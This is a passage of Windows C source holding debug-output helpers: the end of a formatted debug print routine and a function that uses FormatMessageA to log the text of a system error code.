	UNREFERENCED_PARAMETER(_Format);
	return;
#else
	char buff[1025];
	va_list arg;

	va_start(arg, _Format);
#ifdef DEBUG_PRINT_CONSOLE 
	vprintf_s(_Format, arg);
#endif //DEBUG_PRINT_CONSOLE 
	StringCchVPrintfA(buff, 1024, _Format, arg);
	OutputDebugStringA(buff);
	va_end(arg);
#endif
}

void OutputSystemError(__in_opt DWORD dwErr/* = 0*/)
{
#ifndef _DEBUG
	UNREFERENCED_PARAMETER(dwErr);
	return;
#else
	LPSTR errorText = NULL;
	if (dwErr == 0)
		dwErr = GetLastError();

	FormatMessageA(
		// use system message tables to retrieve error text
		FORMAT_MESSAGE_FROM_SYSTEM
		// allocate buffer on local heap for error text
		| FORMAT_MESSAGE_ALLOCATE_BUFFER
		// Important! will fail otherwise, since we're not 
		// (and CANNOT) pass insertion parameters
		| FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,    // unused with FORMAT_MESSAGE_FROM_SYSTEM
		dwErr,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&errorText,  // output 
		0, // minimum size for output buffer
		NULL);   // arguments - see note 

	if (NULL != errorText)
	{
		// ... do something with the string `errorText` - log it, display it to the user, etc.
		PrintDebug("%s", errorText);
		// release memory allocated by FormatMessage()
		LocalFree(errorText);
		errorText = NULL;
	}
#endif //_DEBUG
}
